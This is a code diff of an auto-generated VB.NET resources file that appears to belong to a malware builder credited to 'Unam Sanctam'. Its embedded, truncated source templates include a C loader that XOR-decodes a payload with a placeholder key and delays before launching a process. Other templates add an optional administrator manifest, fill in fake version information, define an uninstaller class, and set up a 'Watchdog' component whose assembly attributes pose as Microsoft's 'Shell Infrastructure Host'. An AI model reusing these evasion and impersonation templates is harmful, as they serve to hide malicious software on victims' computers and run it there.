@@ -73,38 +73,20 @@ Namespace My.Resources
         '''<summary>
         '''  Looks up a localized resource of type System.Byte[].
         '''</summary>
-        Friend ReadOnly Property libs() As Byte()
+        Friend ReadOnly Property Compilers() As Byte()
             Get
-                Dim obj As Object = ResourceManager.GetObject("libs", resourceCulture)
+                Dim obj As Object = ResourceManager.GetObject("Compilers", resourceCulture)
                 Return CType(obj,Byte())
             End Get
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to using System;
-        '''using System.IO;
-        '''using System.Reflection;
-        '''using System.Security.Cryptography;
-        '''using System.Runtime.InteropServices;
-        '''using System.Text;
-        '''using System.Resources;
-        '''using System.Threading;
-        '''using System.Diagnostics;
-        '''using System.Runtime.InteropServices;
-        '''using System.Linq;
-        '''#if DefDebug
-        '''using System.Windows.Forms;
-        '''#endif
-        '''
-        '''#if DefAssembly
-        '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
-        '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        '''[assembly: AssemblyPr [rest of string was truncated]&quot;;.
+        '''  Looks up a localized resource of type System.Byte[].
         '''</summary>
-        Friend ReadOnly Property Loader() As String
+        Friend ReadOnly Property libs() As Byte()
             Get
-                Return ResourceManager.GetString("Loader", resourceCulture)
+                Dim obj As Object = ResourceManager.GetObject("libs", resourceCulture)
+                Return CType(obj,Byte())
             End Get
         End Property
         
@@ -150,8 +132,6 @@ Namespace My.Resources
         '''using System.Security.Principal;
         '''using System.Text;
         '''using System.Threading;
-        '''using System.Linq;
-        '''using Microsoft.Win32;
         '''#if DefDebug
         '''using System.Windows.Forms;
         '''#endif
@@ -159,7 +139,8 @@ Namespace My.Resources
         '''#if DefAssembly
         '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
-        '''[assembly: As [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+        '''[assembly: AssemblyProduct(&quot;%Produ [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -168,9 +149,70 @@ Namespace My.Resources
         End Property
         
         '''<summary>
+        '''  Looks up a localized string similar to #include &lt;stdio.h&gt;
+        '''#include &lt;stdlib.h&gt;
+        '''#include &lt;windows.h&gt;
+        '''#include &lt;sys/types.h&gt;
+        '''#include &lt;syscalls.h&gt;
+        '''
+        '''/* Created by Unam Sanctam, https://github.com/UnamSanctam */
+        '''
+        '''char* cipher(char* data, long dataLen) {
+        '''	char* key = &quot;#KEY&quot;;
+        '''	int keyLen = strlen(key);
+        '''	char* output = (char*)malloc(sizeof(char) * dataLen+1);
+        '''	output[dataLen] = 0;
+        '''	for (int i = 0; i &lt; dataLen; ++i) {
+        '''		output[i] = data[i] ^ key[i % keyLen];
+        '''	}
+        '''	return output;
+        '''}
+        '''
+        '''int main(int argc, char **argv){
+        '''	Sleep(#DELAY * 1000);
+        '''
+        '''	PROCESS_INFORMATI [rest of string was truncated]&quot;;.
+        '''</summary>
+        Friend ReadOnly Property Program1() As String
+            Get
+                Return ResourceManager.GetString("Program1", resourceCulture)
+            End Get
+        End Property
+        
+        '''<summary>
+        '''  Looks up a localized string similar to #ifdef DefIcon
+        '''MAINICON ICON &quot;#ICON&quot;
+        '''#endif
+        '''#ifdef DefAdmin
+        '''1 24 &quot;administrator.manifest&quot;
+        '''#endif
+        '''#ifdef DefAssembly
+        '''1 VERSIONINFO
+        '''FILEVERSION     #VERSION
+        '''PRODUCTVERSION  #VERSION
+        '''BEGIN
+        '''    BLOCK &quot;StringFileInfo&quot;
+        '''    BEGIN
+        '''        BLOCK &quot;040904b0&quot;
+        '''        BEGIN
+        '''            VALUE &quot;CompanyName&quot;, &quot;#COMPANY&quot;
+        '''			VALUE &quot;FileTitle&quot;, &quot;#TITLE&quot;
+        '''            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
+        '''            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
+        '''            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
+        '''			VALUE &quot; [rest of string was truncated]&quot;;.
+        '''</summary>
+        Friend ReadOnly Property resource() As String
+            Get
+                Return ResourceManager.GetString("resource", resourceCulture)
+            End Get
+        End Property
+        
+        '''<summary>
         '''  Looks up a localized string similar to using System;
         '''using System.IO;
         '''using System.Reflection;
+        '''using System.Security.Principal;
         '''using System.Security.Cryptography;
         '''using System.Runtime.InteropServices;
         '''using System.Text;
@@ -178,18 +220,15 @@ Namespace My.Resources
         '''using System.Threading;
         '''using System.Diagnostics;
         '''using Microsoft.Win32;
-        '''using System.Linq;
         '''using System.Collections.Generic;
         '''using System.Management;
         '''#if DefDebug
         '''using System.Windows.Forms;
         '''#endif
         '''
-        '''[assembly: Guid(&quot;%Guid%&quot;)]
-        '''
         '''public partial class RUninstaller
         '''{
-        '''    public static string rbD = Environment.GetFolderPath(Environment.Specia [rest of string was truncated]&quot;;.
+        '''    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.App [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Uninstaller() As String
             Get
@@ -203,11 +242,11 @@ Namespace My.Resources
         '''using System.IO;
         '''using System.Management;
         '''using System.Reflection;
+        '''using System.Security.Principal;
         '''using System.Security.Cryptography;
         '''using System.Runtime.InteropServices;
         '''using System.Text;
         '''using System.Threading;
-        '''using System.Linq;
         '''#if DefDebug
         '''using System.Windows.Forms;
         '''#endif
@@ -215,7 +254,7 @@ Namespace My.Resources
         '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
         '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
-        '''[assembly: AssemblyCopyright(&quot;© Micr [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyCop [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Watchdog() As String
             Get
